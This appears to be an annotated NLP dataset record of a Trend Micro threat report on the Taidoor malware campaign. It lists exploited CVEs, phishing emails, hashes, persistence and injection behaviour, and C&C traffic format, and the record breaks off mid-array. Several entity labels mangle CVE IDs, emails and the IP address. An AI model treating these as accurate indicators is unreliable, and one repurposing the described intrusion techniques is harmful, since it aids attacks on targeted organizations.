[[{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "Taidoor", "sent_id": 33, "pos": [0]}, {"old_id": "T2", "type": "Organization", "name": "Trend Micro", "sent_id": 33, "pos": [5, 6]}, {"old_id": "T3", "type": "Malware", "name": "BKDR_SIMBOT", "sent_id": 34, "pos": [0]}, {"old_id": "T4", "type": "Country", "name": "Taiwan", "sent_id": 41, "pos": [3]}, {"old_id": "T5", "type": "Software", "name": "Smart Protection Network\u2122", "sent_id": 48, "pos": []}, {"old_id": "T6", "type": "Organization", "name": "Trend Micro\u2122", "sent_id": 48, "pos": [3, 4]}, {"old_id": "T7", "type": "Time", "name": "March 4 2009", "sent_id": 65, "pos": [5, 8]}, {"old_id": "T8", "type": "Malware", "name": "Taidoor", "sent_id": 64, "pos": [1]}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "Taiwanese government", "sent_id": 70, "pos": []}, {"old_id": "T10", "type": "Campaign", "name": "Taidoor", "sent_id": 77, "pos": [1]}, {"old_id": "T11", "type": "Software", "name": "Microsoft Common Controls", "sent_id": 81, "pos": [1, 3]}, {"old_id": "T12", "type": "Vulnerability", "name": "CVE-2012- 0158", "sent_id": 81, "pos": []}, {"old_id": "T13", "type": "Software", "name": "Adobe Reader", "sent_id": 85, "pos": [7, 8]}, {"old_id": "T14", "type": "Software", "name": "Acrobat", "sent_id": 86, "pos": [0]}, {"old_id": "T15", "type": "Software", "name": "Flash Player", "sent_id": 86, "pos": [3, 4]}, {"old_id": "T16", "type": "Vulnerability", "name": "CVE-20094324", "sent_id": 86, "pos": [9]}, {"old_id": "T17", "type": "Vulnerability", "name": "CVE-2010-1297", "sent_id": 86, "pos": []}, {"old_id": "T18", "type": "Vulnerability", "name": "CVE-2010-2883", "sent_id": 86, "pos": [14]}, {"old_id": "T19", "type": "Vulnerability", "name": "CVE-20110611", "sent_id": 86, "pos": []}, {"old_id": "T20", "type": "Malware", "name": "Taidoor", "sent_id": 84, "pos": [0]}, {"old_id": "T21", "type": "Vulnerability", "name": "CVE-2011-1269", "sent_id": 87, "pos": [5]}, {"old_id": "T22", "type": "Vulnerability", "name": "CVE-20093129", "sent_id": 87, "pos": []}, {"old_id": "T23", "type": "Software", "name": "Microsoft Office", "sent_id": 87, "pos": [15, 16]}, {"old_id": "T24", "type": "File", "name": "[2 characters]tmp", "sent_id": 134, "pos": []}, {"old_id": "T25", "type": "File", "name": "~dfds3reg", "sent_id": 137, "pos": []}, {"old_id": "T26", "type": "Malware", "name": "Taidoor", "sent_id": 131, "pos": [6]}, {"old_id": "T27", "type": "Indicator", "name": "aaaaaphpid=bbbbbbcccccccccccc", "sent_id": 153, "pos": []}, {"old_id": "T28", "type": "Email", "name": "minakiyang@yahoocom", "sent_id": 186, "pos": []}, {"old_id": "T29", "type": "Time", "name": "October 25 2011", "sent_id": 188, "pos": [2, 5]}, {"old_id": "T30", "type": "Address", "name": "6024921982", "sent_id": 189, "pos": []}, {"old_id": "T31", "type": "MD5", "name": "97ff2338e568fc382d41c30c31f89720", "sent_id": 191, "pos": [0]}, {"old_id": "T32", "type": "Malware", "name": "Taidoor", "sent_id": 168, "pos": [4]}, {"old_id": "T33", "type": "Address", "name": "6024921982", "sent_id": 200, "pos": []}, {"old_id": "T34", "type": "MD5", "name": "5fd848000d68f45271a0e1abd5844493", "sent_id": 202, "pos": [0]}, {"old_id": "T35", "type": "Email", "name": "95273503@nccuedutw", "sent_id": 209, "pos": []}, {"old_id": "T36", "type": "Address", "name": "6024921982", "sent_id": 211, "pos": []}, {"old_id": "T37", "type": "MD5", "name": "8406c1ae494add6e4f0e78b476fb4db0", "sent_id": 213, "pos": [0]}, {"old_id": "T38", "type": "Malware", "name": "BKDR_SIMBOT", "sent_id": 240, "pos": [7]}, {"old_id": "T39", "type": "Malware", "name": "BKDR_SIMBOTSMXA", "sent_id": 242, "pos": []}, {"old_id": "T40", "type": "Malware", "name": "BKDR_SIMBOTSME", "sent_id": 243, "pos": []}, {"old_id": "T41", "type": "MalwareFamily", "name": "SIMBOT", "sent_id": 244, "pos": [2]}, {"old_id": "T42", "type": "Obfuscation", "name": "Adobe Flash Player installer", "sent_id": 245, "pos": []}, {"old_id": "T43", "type": "MalwareCharacteristics", "name": "HTTP", "sent_id": 269, "pos": [0]}, {"old_id": "T44", "type": "MalwareCharacteristics", "name": "RC4 encryption", "sent_id": 269, "pos": [3, 4]}, {"old_id": "T45", "type": "Malware", "name": "SIMBOT", "sent_id": 263, "pos": [7]}, {"old_id": "T46", "type": "Indicator", "name": "HKLM\\SOFTWARE\\McAfee", "sent_id": 277, "pos": [0]}, {"old_id": "T47", "type": "SourceCodeInformation", "name": "C++", "sent_id": 281, "pos": [6]}, {"old_id": "T48", "type": "SourceCodeInformation", "name": "11776 bytes", "sent_id": 282, "pos": []}, {"old_id": "T49", "type": "Indicator", "name": "WinHttp", "sent_id": 289, "pos": []}, {"old_id": "T50", "type": "Indicator", "name": "[C&C]/{5 random characters}phpid={6 random numbers}{encrypted victim\u2019s MAC address}", "sent_id": 295, "pos": []}, {"old_id": "T51", "type": "Malware", "name": "Taidoor", "sent_id": 292, "pos": [11]}, {"old_id": "T52", "type": "SystemInformation", "name": "MAC address", "sent_id": 297, "pos": [2, 3]}, {"old_id": "T53", "type": "Software", "name": "Smart Protection Network", "sent_id": 347, "pos": [10, 12]}, {"old_id": "T54", "type": "Organization", "name": "Trend Micro", "sent_id": 347, "pos": [8, 9]}, {"old_id": "T55", "type": "Time", "name": "October 2010", "sent_id": 348, "pos": [7, 8]}, {"old_id": "T56", "type": "Malware", "name": "Taidoor", "sent_id": 347, "pos": [2]}, {"old_id": "T57", "type": "Campaign", "name": "Taidoor", "sent_id": 528, "pos": [4]}, {"old_id": "T58", "type": "TrojanHorse", "name": "Remote Access Trojan", "sent_id": 530, "pos": [4, 6]}, {"old_id": "T59", "type": "Exploit", "name": "denial of service", "sent_id": 536, "pos": []}, {"old_id": "T60", "type": "CourseOfAction", "name": "solid patch management", "sent_id": 543, "pos": []}, {"old_id": "T61", "type": "CourseOfAction", "name": "endpoint and network security", "sent_id": 543, "pos": []}, {"old_id": "T62", "type": "CourseOfAction", "name": "firewall use", "sent_id": 544, "pos": []}, {"old_id": "T63", "type": "CourseOfAction", "name": "data loss prevention", "sent_id": 546, "pos": [2, 4]}, {"old_id": "T64", "type": "CourseOfAction", "name": "Enhanced visibility", "sent_id": 563, "pos": []}, {"old_id": "T65", "type": "CourseOfAction", "name": "Logs from endpoint", "sent_id": 563, "pos": [2, 4]}, {"old_id": "T66", "type": "CourseOfAction", "name": "network monitoring", "sent_id": 564, "pos": [1, 2]}, {"old_id": "T67", "type": "CourseOfAction", "name": "Integrity checks", "sent_id": 570, "pos": []}, {"old_id": "T68", "type": "CourseOfAction", "name": "Empowering the human analyst", "sent_id": 574, "pos": []}, {"old_id": "T69", "type": "Software", "name": "Deep Discovery", "sent_id": 581, "pos": [0, 1]}, {"old_id": "T70", "type": "Organization", "name": "Trend Micro", "sent_id": 580, "pos": []}, {"old_id": "T71", "type": "CourseOfAction", "name": "cut off communications with the C&C server", "sent_id": 593, "pos": []}, {"old_id": "T72", "type": "CourseOfAction", "name": "Determine the scope of the compromise", "sent_id": 595, "pos": [0, 5]}, {"old_id": "T73", "type": "CourseOfAction", "name": "analyzing the data and forensic artifacts", "sent_id": 596, "pos": []}, {"old_id": "T74", "type": "CourseOfAction", "name": "fortify affected servers", "sent_id": 600, "pos": [3, 5]}, {"old_id": "T75", "type": "CourseOfAction", "name": "education and training programs", "sent_id": 609, "pos": [0, 3]}, {"old_id": "T76", "type": "Time", "name": "October 2010", "sent_id": 809, "pos": [20, 21]}, {"old_id": "T77", "type": "Campaign", "name": "Taidoor", "sent_id": 809, "pos": [11]}, {"old_id": "T78", "type": "Vulnerability", "name": "CVE-2012-0158", "sent_id": 816, "pos": [0]}, {"old_id": "T79", "type": "Vulnerability", "name": "CVE-2009-4324", "sent_id": 816, "pos": [2]}, {"old_id": "T80", "type": "Vulnerability", "name": "CVE-2010-1297", "sent_id": 816, "pos": [4]}, {"old_id": "T81", "type": "Vulnerability", "name": "CVE-2010-2883", "sent_id": 816, "pos": [6]}, {"old_id": "T82", "type": "Vulnerability", "name": "CVE-2011-0611", "sent_id": 816, "pos": [8]}, {"old_id": "T83", "type": "Vulnerability", "name": "CVE-2011-1269", "sent_id": 816, "pos": [10]}, {"old_id": "T84", "type": "Vulnerability", "name": "CVE-2009-3129", "sent_id": 816, "pos": [13]}], "labels": [{"old_id": "R1", "r": "P32", "h": 0, "t": 3, "evidence": [33, 34, 35, 36, 37, 38, 39, 40, 41]}, {"old_id": "R2", "r": "P17", "h": 5, "t": 4, "evidence": [48]}, {"old_id": "R3", "r": "P33", "h": 7, "t": 6, "evidence": [64, 65]}, {"old_id": "R4", "r": "P19", "h": 10, "t": 11, "evidence": [81]}, {"old_id": "R5", "r": "P7", "h": 19, "t": 15, "evidence": [84, 85, 86]}, {"old_id": "R6", "r": "P7", "h": 19, "t": 16, "evidence": [84, 85, 86]}, {"old_id": "R7", "r": "P7", "h": 19, "t": 17, "evidence": [84, 85, 86]}, {"old_id": "R8", "r": "P7", "h": 19, "t": 18, "evidence": [84, 85, 86]}, {"old_id": "R9", "r": "P19", "h": 22, "t": 20, "evidence": [87]}, {"old_id": "R10", "r": "P19", "h": 22, "t": 21, "evidence": [87]}, {"old_id": "R11", "r": "P21", "h": 23, "t": 25, "evidence": []}, {"old_id": "R12", "r": "P21", "h": 24, "t": 25, "evidence": []}, {"old_id": "R13", "r": "P21", "h": 27, "t": 31, "evidence": []}, {"old_id": "R14", "r": "P33", "h": 31, "t": 28, "evidence": [168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188]}, {"old_id": "R15", "r": "P21", "h": 29, "t": 31, "evidence": []}, {"old_id": "R16", "r": "P21", "h": 30, "t": 31, "evidence": []}, {"old_id": "R17", "r": "P14", "h": 39, "t": 40, "evidence": [243, 244]}, {"old_id": "R18", "r": "P14", "h": 38, "t": 40, "evidence": [242, 243, 244]}, {"old_id": "R19", "r": "P16", "h": 40, "t": 39, "evidence": []}, {"old_id": "R20", "r": "P16", "h": 40, "t": 38, "evidence": []}, {"old_id": "R21", "r": "P13", "h": 44, "t": 42, "evidence": [263, 264, 265, 266, 267, 268, 269]}, {"old_id": "R22", "r": "P13", "h": 44, "t": 43, "evidence": [263, 264, 265, 266, 267, 268, 269]}, {"old_id": "R23", "r": "P21", "h": 49, "t": 50, "evidence": []}, {"old_id": "R24", "r": "P17", "h": 53, "t": 52, "evidence": [347]}, {"old_id": "R25", "r": "P33", "h": 55, "t": 54, "evidence": [347, 348]}, {"old_id": "R26", "r": "P22", "h": 56, "t": 57, "evidence": [528, 529, 530]}, {"old_id": "R27", "r": "P22", "h": 56, "t": 58, "evidence": [528, 529, 530, 531, 532, 533, 534, 535, 536]}, {"old_id": "R28", "r": "P17", "h": 69, "t": 68, "evidence": [580, 581]}, {"old_id": "R29", "r": "P33", "h": 76, "t": 75, "evidence": [809]}], "title": ["inputs/txt/201208TrendMicroTaidoor"], "sents": [["Trend", "Micro", "Incorporated"], ["Research", "Paper"], ["2012"], ["The", "Taidoor", "Campaign"], ["AN", "IN-DEPTH", "ANALYSIS"], ["By:", "Trend", "Micro", "Threat", "Research", "Team"], ["CONTENTS"], ["Introduction", "", ".", "...........................................................................................................................", "1"], ["Detection", "", ".", "................................................................................................................................", "1"], ["Context", "", ".", "..................................................................................................................................", "2"], ["Attack", "Vectors", "", ".", ".....................................................................................................................", "2"], ["Social", "Engineering", "Ploy", "", ".", "................................................................................................", "2"], ["Operations", "", ".", "............................................................................................................................", "3"], ["Technical", "Indicators", ".", "...........................................................................................................", "3"], ["System", "Modifications", "", ".", "....................................................................................................", "3"], ["Persistence", "Mechanism", "", ".", "................................................................................................", "3"], ["Network", "Traffic", "", ".", "...............................................................................................................", "3"], ["Malware", "Analysis", "", ".", "............................................................................................................", "4"], ["Arrival", "Vectors", "", ".", "............................................................................................................", "4"], ["Exploits", ",", "Payloads", ",", "and", "Decoy", "Documents", "", ".", ".........................................................", "4"], ["Network", "Communication", "", ".", ".........................................................................................", "5"], ["Complete", "List", "of", "C&C", "Commands", "", ".", ".........................................................................", "6"], ["Timeline", "", ".", ".................................................................................................................................", "7"], ["Damage", "", ".", "................................................................................................................................", "10"], ["Defending", "Against", "APTs", "", ".", ".................................................................................................", "10"], ["Local", "and", "External", "Threat", "Intelligence", "", ".", "..................................................................", "10"], ["Mitigation", "and", "Cleanup", "Strategy", "", ".", "...............................................................................", "11"], ["Educating", "Employees", "Against", "Social", "Engineering", "", ".", "...............................................", "11"], ["Data-Centric", "Protection", "Strategy", "", ".", ".............................................................................", "11"], ["Trend", "Micro", "Threat", "Protection", "Against", "Taidoor", "Campaign", "Components", "", ".", ".......", "12"], ["i", "|", "The", "Taidoor", "Campaign"], ["INTRODUCTION"], ["DETECTION"], ["Taidoor", "malware", ",", "detected", "by", "Trend", "Micro", "as"], ["BKDR_SIMBOT", "variants", ",", "have", "been", "historically"], ["documented", "for", "their", "use", "in", "targeted", "attacks", ".", "Using"], ["techniques", "developed", "to", "match", "the", "network", "traffic"], ["Taidoor", "malware", "generate", "when", "communicating", "with", "a"], ["command-and-control", "(C&C)", "server", ",", "we", "were", "able", "to"], ["identify", "victims", "that", "these", "appeared", "to", "have"], ["compromised", ".", "All", "of", "the", "compromise", "victims", "we"], ["discovered", "were", "from", "Taiwan", ",", "the", "majority", "of", "which"], ["were", "government", "organizations", "."], ["Looking", "at", "threat", "intelligence", "derived", "from", "tracking"], ["advanced", "persistent", "threat", "(APT)", "campaigns", "over", "time", ","], ["we", "were", "able", "to", "develop", "indicators", "of", "compromise"], ["primarily", "based", "on", "the", "network", "traffic", "generated", "by", "the"], ["malware", "used", "in", "the", "Taidoor", "campaign", ".", "Using", "data"], ["collected", "from", "the", "Trend", "Micro\u2122", "Smart", "Protection"], ["Network\u2122", ",", "we", "are", "able", "to", "identify", "victims", "whose"], ["networks", "communicated", "with", "Taidoor", "C&C", "servers", "."], ["While", "we", "are", "unable", "to", "determine", "the", "exact", "method", "by"], ["which", "any", "of", "the", "victims\u2019", "networks", "were", "compromised", ","], ["the", "information", "we", "collected", "did", "indicate", "which", "specific"], ["Taidoor", "malware", "samples", "contacted", "which", "C&C", "servers", "."], ["We", "also", "obtained", "email", "samples", "associated", "with", "the"], ["delivery", "of", "the", "Taidoor", "malware", "samples", ".", "As", "such", ",", "we"], ["were", "able", "to", "provide", "an", "overview", "of", "the", "Taidoor"], ["campaign", ",", "including", "the", "attack", "vectors", "and", "malware", "the"], ["attackers", "used", ",", "and", "come", "up", "with", "a", "remediation"], ["strategy", "."], ["1", "|", "The", "Taidoor", "Campaign"], ["CONTEXT"], ["ATTACK", "VECTORS"], ["The", "Taidoor", "attackers", "have", "been", "actively", "engaging", "in"], ["targeted", "attacks", "since", "at", "least", "March", "4", ",", "2009", ".", "Despite"], ["some", "exceptions", ",", "the", "Taidoor", "campaign", "often", "used"], ["Taiwanese", "IP", "addresses", "as", "C&C", "servers", "and", "email"], ["addresses", "to", "send", "out", "socially", "engineered", "emails", "with"], ["malware", "as", "attachments", ".", "One", "of", "the", "primary", "targets", "of"], ["the", "Taidoor", "campaign", "appeared", "to", "be", "the", "Taiwanese"], ["government", ".", "The", "attackers", "spoofed", "Taiwanese"], ["government", "email", "addresses", "to", "send", "out", "socially"], ["engineered", "emails", "in", "the", "Chinese", "language", "that", "typically"], ["leveraged", "Taiwan-themed", "issues", ".", "The", "attackers", "actively"], ["sent", "out", "malicious", "documents", "and", "maintained", "several", "IP"], ["addresses", "for", "command", "and", "control", "."], ["The", "Taidoor", "campaign", "exploits", "a", "wide", "variety", "of"], ["vulnerabilities", "as", "attack", "vectors", ",", "old", "and", "new", "alike", ".", "Data"], ["from", "the", "early", "part", "of", "this", "year", "shows", "that", "the", "Taidoor"], ["attackers", "rampantly", "used", "malicious", "", ".", "DOC", "files", "to", "exploit"], ["a", "Microsoft", "Common", "Controls", "vulnerability", ",", "CVE-2012-"], ["0158", ".", "1"], ["Historical", "data", ",", "on", "the", "other", "hand", ",", "shows", "that", "the"], ["Taidoor", "attackers", "also", "distributed", "emails", "with", "malicious"], ["", ".", "PDF", "file", "attachments", "that", "exploited", "Adobe", "Reader", ","], ["Acrobat", ",", "or", "Flash", "Player", "vulnerabilities", "(e", ".", "g.,", "CVE-20094324", ",", "2CVE-2010-1297", ",", "3", "CVE-2010-2883", ",", "4", "and", "CVE-20110611)", ".", "5", "They", "also", "used", "malicious", "Microsoft", "Excel", "and"], ["PowerPoint", "files", "(e", ".", "g.,", "CVE-2011-1269", "6", "and", "CVE-20093129)", "7", "to", "exploit", "old", "vulnerabilities", "in", "Microsoft", "Office", "."], ["S", "ocial", "E", "ngineer", "ing", "P", "loy"], ["As", "part", "of", "their", "social", "engineering", "ploy", ",", "the", "Taidoor"], ["attackers", "attach", "a", "decoy", "document", "to", "their", "emails", "that", ","], ["when", "opened", ",", "displays", "the", "contents", "of", "a", "legitimate"], ["document", "but", "executes", "a", "malicious", "payload", "in", "the"], ["background", "."], ["1"], ["http://www", ".", "cve.mitre.org/cgi-bin/cvename.cgi?name=CVE2012-0158"], ["2"], ["http://web", ".", "nvd.nist.gov/view/vuln/detail?vulnId=CVE-20094324"], ["3"], ["http://web", ".", "nvd.nist.gov/view/vuln/detail?vulnId=CVE-20101297"], ["4"], ["http://web", ".", "nvd.nist.gov/view/vuln/detail?vulnId=CVE-20102883"], ["5"], ["http://web", ".", "nvd.nist.gov/view/vuln/detail?vulnId=CVE-20110611"], ["6"], ["http://web", ".", "nvd.nist.gov/view/vuln/detail?vulnId=CVE-20111269"], ["7"], ["http://web", ".", "nvd.nist.gov/view/vuln/detail?vulnId=CVE-20093129"], ["2", "|", "The", "Taidoor", "Campaign"], ["OPERATIONS"], ["TECHNICAL", "INDICATORS"], ["We", "were", "only", "able", "to", "gather", "a", "limited", "amount", "of"], ["information", "regarding", "the", "Taidoor", "attackers\u2019", "activities"], ["after", "they", "have", "compromised", "a", "target", ".", "We", "did", ",", "however", ","], ["find", "that", "the", "Taidoor", "malware", "allowed", "attackers", "to"], ["operate", "an", "interactive", "shell", "on", "compromised", "computers"], ["and", "to", "upload", "and", "download", "files", ".", "In", "order", "to", "determine"], ["the", "operational", "capabilities", "of", "the", "attackers", "behind", "the"], ["Taidoor", "campaign", ",", "we", "monitored", "a", "compromised"], ["honeypot", ".", "The", "attackers", "issued", "out", "some", "basic"], ["commands", "in", "an", "attempt", "to", "map", "out", "the", "extent", "of", "the"], ["network", "compromise", "but", "quickly", "realized", "that", "the"], ["honeypot", "was", "not", "an", "intended", "targeted", "and", "so", "promptly"], ["disabled", "the", "Taidoor", "malware", "running", "on", "it", ".", "This"], ["indicated", "that", "while", "Taidoor", "malware", "were", "more", "widely"], ["distributed", "compared", "with", "those", "tied", "to", "other", "targeted"], ["campaigns", ",", "the", "attackers", "could", "quickly", "assess", "their"], ["targets", "and", "distinguish", "these", "from", "inadvertently"], ["compromised", "computers", "and", "honeypots", "."], ["S", "ystem", "Modifications"], ["Opening", "a", "malicious", "document", "(i", ".", "e.,", "", ".", "PDF,", "", ".", "DOC,", "", ".", "XLS,", "or"], ["", ".", "PPT", "file)", "allows", "the", "Taidoor", "malware", "to", "create", "two", "files"], ["in", "a", "user\u2019s", "Temp", "folder\u2014C:\\Documents", "and"], ["Settings\\[USER]\\Local", "Settings\\Temp", ".", "The", "first", "file", "is"], ["typically", "a", "small", "executable", "file", "(i", ".", "e.,", "17", ".", "5KB)", "named", "\u201c[2"], ["characters]", ".", "tmp.\u201d", "This", "is", "copied", "to", "another", "folder", ","], ["usually", "C:\\Documents", "and", "Settings\\[USER]\\Local"], ["Settings", ",", "and", "renamed", "to", "\u201c~dfds3", ".", "reg,\u201d", "which", "modifies"], ["the", "Windows", "Registry", "before", "being", "deleted", "."], ["P", "er", "sistence", "Mechanism"], ["The", "Taidoor", "malware", "uses", "the", "file", ",", "~dfds3", ".", "reg,", "to", "modify"], ["the", "Windows", "Registry", "in", "order", "to", "maintain", "persistence", "."], ["While", "the", "names", "of", "the", "registry", "entries", "and", "the"], ["executable", "files", "may", "vary", ",", "these", "consistently", "modified"], ["the", "key", ",", "HKCU\\SOFTWARE\\Microsoft\\Windows\\"], ["CurrentVersion\\Run", "."], ["Networ", "k", "T", "r", "affic"], ["The", "Taidoor", "malware", "produces", "identifiable", "network"], ["traffic", ".", "These", "often", "directly", "accessed", "an", "IP", "address", "."], ["Sometimes", ",", "however", ",", "certain", "samples", "made", "use", "of"], ["domain", "names", "for", "HTTP", "communication", ".", "In", "such", "a", "case", ","], ["the", "GET", "and", "POST", "requests", "contained", "a", "URL", "path", "such"], ["as:"], ["aaaaa", ".", "php?id=bbbbbbcccccccccccc"], ["\u201caaaaa\u201d", "refers", "to", "five", "random", "characters", "that", "form", "a"], ["file", "name", "such", "as", "\u201cqfgkt", ".", "php,\u201d", "followed", "by", "\u201cbbbbbb", ",", "\u201d", "six"], ["pseudorandomly", "generated", "characters", "that", "change", "for"], ["each", "connection", ".", "\u201ccccccccccccc\u201d", "refers", "to", "12", "characters"], ["that", "represent", "the", "compromised", "host\u2019s", "MAC", "address"], ["that", "is", "obfuscated", "using", "a", "custom", "algorithm", ".", "The"], ["compromised", "host\u2019s", "MAC", "address", "is", "communicated", "to"], ["the", "Taidoor", "C&C", "server", "this", "way", "because", "it", "is", "used", "as", "an"], ["RC4", "encryption", "key", "to", "encrypt", "the", "subsequent", "network"], ["communication", "between", "the", "compromised", "host", "and", "the"], ["C&C", "server", "."], ["3", "|", "The", "Taidoor", "Campaign"], ["Malwar", "e", "Analysis"], ["Arrival", "Vectors"], ["The", "majority", "of", "the", "Taidoor", "malware", "samples", "we", "have"], ["seen", "in", "the", "wild", "were", "delivered", "via", "email", ".", "We", "also", "saw"], ["considerable", "variations", "among", "the", "email", "and", "IP"], ["addresses", "the", "senders", "used", "."], ["We", "listed", "down", "some", "of", "the", "emails", "that", "were", "sent", "via", "an"], ["IP", "address", "that", "also", "served", "as", "a", "C&C", "server", "below", ".", "This"], ["was", "one", "of", "the", "IP", "addresses", "that", "some", "compromised"], ["systems", "accessed", ".", "While", "we", "do", "not", "exactly", "know", "how"], ["the", "compromises", "occurred", ",", "we", "can", ",", "based", "on", "the"], ["attackers\u2019", "method", "of", "operation", ",", "determine", "which", "email"], ["was", "the", "most", "likely", "attack", "vector", "."], ["\u2022"], ["Sample", "email", "1", "8"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["From:", "minaki", ".", "yang@yahoo.com"], ["Subject:", "US-TAIWAN"], ["Date", "sent:", "October", "25", ",", "2011"], ["Sender\u2019s", "IP", "address:", "60", ".", "249.219.82"], ["MD5", "hash:"], ["97ff2338e568fc382d41c30c31f89720"], ["\u2022"], ["Sample", "email", "2", "9"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["From:", "[redacted]@wpafb", ".", "af.mil"], ["Subject:", "20111012"], ["Sender\u2019s", "IP", "address:", "60", ".", "249.219.82"], ["MD5", "hash:"], ["5fd848000d68f45271a0e1abd5844493"], ["\u2022"], ["Sample", "email", "3", "10"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["From:", "95273503@nccu", ".", "edu.tw"], ["Subject:", "\u7a3f\u4ef6", "\u5982\u9644\u6a94\uff0c\u8acb\u6536\u6089"], ["Sender\u2019s", "IP", "address:", "60", ".", "249.219.82"], ["MD5", "hash:"], ["8406c1ae494add6e4f0e78b476fb4db0"], ["Exploits", ",", "Payloads", ",", "and", "Decoy", "Documents"], ["The", "shellcode", "in", "the", "exploit", "document", "is", "commonly"], ["encrypted", ".", "To", "successfully", "exploit", "a", "vulnerability", ",", "the"], ["shellcode", "is", "first", "decrypted", ".", "It", "then", "searches", "for", "the"], ["filehandle", "of", "the", "exploit", "document", "by", "comparing", "the", "file"], ["sizes", "of", "enumerated", "handles", "to", "a", "hardcoded", "file", "size"], ["that", "is", "supposed", "to", "be", "that", "of", "the", "exploit", "document", "."], ["Once", "the", "handle", "is", "found", ",", "two", "buffers", "are", "read", "from", "the"], ["exploit", "document", ",", "which", "contains", "the", "encrypted", "payload"], ["and", "an", "encrypted", "decoy", "document", "."], ["The", "payload", "is", "then", "decrypted", "and", "saved", "as", "a", "file", "in", "the"], ["Windows", "temporary", "directory", ".", "The", "payload", "is", "then"], ["commonly", "executed", "using", "the", "WinExec", "application"], ["programming", "interface", "(API)", "."], ["After", "the", "payload", "is", "executed", ",", "the", "decoy", "document", "is"], ["decrypted", "and", "also", "saved", "in", "the", "Windows", "temporary"], ["directory", ".", "The", "decoy", "document", "is", "then", "opened", "in", "a", "new"], ["window", "of", "the", "exploited", "application", "to", "convince", "the"], ["victim", "that", "nothing", "is", "wrong", "with", "his/her", "system", ".", "The"], ["process", "that", "executed", "the", "exploit", "shellcode", "is", "then"], ["terminated", "."], ["Keen", "observation", "would", "also", "reveal", "that", "the", "document", "a"], ["victim", "opened", "was", "a", "decoy", "because", "its", "file", "name", "differs"], ["from", "the", "name", "of", "the", "original", "document", "that", "was"], ["exploited", "."], ["The", "main", "purpose", "of", "the", "specially", "crafted", "file"], ["attachments", "is", "to", "silently", "drop", "and", "install", "BKDR_SIMBOT"], ["variants", "in", "the", "target\u2019s", "computer", ".", "11", "These", "BKDR_SIMBOT"], ["variants", "include", "BKDR_SIMBOT", ".", "SMXA", "and"], ["BKDR_SIMBOT", ".", "SME,", "the", "generic", "Trend", "Micro", "detection"], ["names", "for", "SIMBOT", "malware", "."], ["In", "other", "instances", ",", "the", "binary", "poses", "as", "an", "Adobe", "Flash"], ["Player", "installer", "or", "uninstaller", "with", "a", "file", "size", "of", "17", ",", "925"], ["bytes", ".", "The", "file", "was", "written", "using", "Borland\u2019s", "Delphi", ","], ["compiled", "on", "a", "machine", "whose", "default", "language", "was", "set"], ["to", "Chinese", "(Simplified)", ",", "and", "did", "not", "use", "any", "known"], ["binary", "packer", "."], ["8"], ["http://targetedemailattacks", ".", "tumblr.com/post/12137336947/fak"], ["e-excel-from-ibm111"], ["9"], ["http://targetedemailattacks", ".", "tumblr.com/post/11377987600/ma"], ["licious-excel"], ["10"], ["http://contagiodump", ".", "blogspot.com/2011/10/sep-28-cve-20103333-manuscript-with.html"], ["4", "|", "The", "Taidoor", "Campaign"], ["11"], ["http://aboutthreats", ".", "trendmicro.com/malware.aspx?language=us&name=BK"], ["DR_SIMBOT", ".", "SMXA"], ["Figure", "2", ".", "File", "structure", "of", "encrypted", "SIMBOT", "malware"], ["variants"], ["Network", "Communication"], ["The", "binary", "file", "contacts", "the", "C&C", "server", "for", "commands"], ["that", "it", "then", "executes", "on", "the", "victim\u2019s", "machine", "."], ["Communication", "with", "the", "C&C", "server", "is", "done", "through"], ["HTTP", "and", "uses", "RC4", "encryption", "for", "the", "data", "sent", "and"], ["received", "."], ["Figure", "1", ".", "File", "properties", "of", "the", "", ".", "TMP", "of", "the", "malicious"], ["executable", "file"], ["The", "main", "purpose", "of", "the", "dropped", "binary", "file", "is", "to", "install"], ["an", "RC4-encrypted", "executable", "file", ",", "specifically", "in", "the"], ["", ".", "data", "segment", ",", "in", "the", "memory", "space", "of", "a", "known"], ["Windows", "Service", "Process", ".", "If", "the", "registry", ","], ["HKLM\\SOFTWARE\\McAfee", ",", "is", "found", "in", "the", "target\u2019s"], ["machine", ",", "the", "malware", "injects", "the", "executable", "file", "in", "the"], ["services", ".", "exe", "process", ".", "If", "not", ",", "it", "injects", "the", "executable", "file"], ["in", "svchost", ".", "exe."], ["The", "executable", "file", "is", "written", "using", "C++", "and", "has", "a", "file"], ["size", "of", "about", "11", ",", "776", "bytes", ".", "It", "is", "not", "protected", "nor", "packed"], ["using", "any", "known", "binary", "protector", "or", "packer", "and", "has", "a"], ["pretty", "straightforward", "code", ".", "The", "code", "seeks", "out", "inactive"], ["services", "and", "pseudorandomly", "chooses", "one", ",", "which", "it"], ["then", "tries", "to", "kill", ".", "If", "successful", ",", "it", "uses", "the", "service\u2019s", "name"], ["as", "file", "name", "for", "the", "copy", "created", "in", "the", "victim\u2019s", "Temp"], ["folder", "then", "creates", "an", "autorun", "registry", "entry", "for", "the"], ["binary", ".", "If", "not", ",", "\u201cWinHttp\u201d", "is", "prepended", "to", "the", "service\u2019s"], ["name", "."], ["5", "|", "The", "Taidoor", "Campaign"], ["Figure", "3", ".", "Network", "communication", "between", "a", "Taidoorcompromised", "machine", "and", "a", "Taidoor", "C&C", "server"], ["The", "initial", "request", "to", "the", "C&C", "server", "is", "formatted", "as"], ["follows:"], ["[C&C]/{5", "random", "characters}", ".", "php?id={6", "random"], ["numbers}{encrypted", "victim\u2019s", "MAC", "address}"], ["The", "victim\u2019s", "MAC", "address", "is", "sent", "to", "the", "C&C", "server", ",", "as"], ["this", "is", "used", "as", "key", "to", "encrypt", "the", "data", "exchanged", "by", "the"], ["victim\u2019s", "machine", "and", "the", "C&C", "server", ".", "The", "MAC", "address"], ["is", "encrypted", "using", "a", "custom", "algorithm", ",", "which", "basically"], ["increases", "the", "values", "in", "the", "address", "by", "1", "."], ["As", "shown", "in", "Figure", "4", ",", "the", "C&C", "server", "responds", "with"], ["encrypted", "data", ".", "Since", "we", "know", "the", "encryption", "algorithm"], ["used", "and", "that", "the", "key", "is", "the", "MAC", "address", ",", "we", "were", "able"], ["to", "decrypt", "it", "."], ["Complete", "List", "of", "C&C", "Commands"], ["The", "decrypted", "C&C", "command", "was", "formatted", "in", "the"], ["following", "manner:"], ["[command", "type][command", "string]"], ["MAC", 